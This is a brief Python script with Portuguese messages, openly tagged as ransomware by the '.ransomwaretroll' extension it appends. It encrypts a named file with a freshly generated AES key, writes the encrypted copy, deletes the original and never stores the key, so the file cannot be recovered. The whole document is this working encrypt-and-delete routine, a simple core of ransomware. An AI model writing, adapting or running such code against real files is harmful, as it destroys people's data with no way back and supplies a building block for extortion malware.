import os
import pyaes
import secrets

def gerar_chave():
    return secrets.token_bytes(32)  


def criptografar(arquivo, chave):
    try:
       
        if not os.path.isfile(arquivo):
            raise FileNotFoundError(f"O arquivo '{arquivo}' não foi encontrado.")
        
    
        with open(arquivo, "rb") as file:
            file_data = file.read()


        aes = pyaes.AESModeOfOperationCTR(chave)
        encrypt_data = aes.encrypt(file_data)

  
        novo_arquivo = arquivo + ".ransomwaretroll"
        
     
        with open(novo_arquivo, "wb") as new_file:
            new_file.write(encrypt_data)

       
        os.remove(arquivo)

        print(f"Arquivo '{arquivo}' criptografado com sucesso para '{novo_arquivo}' e arquivo original removido!")

    except FileNotFoundError as e:
        print(e)
    except Exception as e:
        print(f"Erro ao criptografar o arquivo: {e}")

arquivo = "projeto.txt"  
chave = gerar_chave()


criptografar(arquivo, chave)
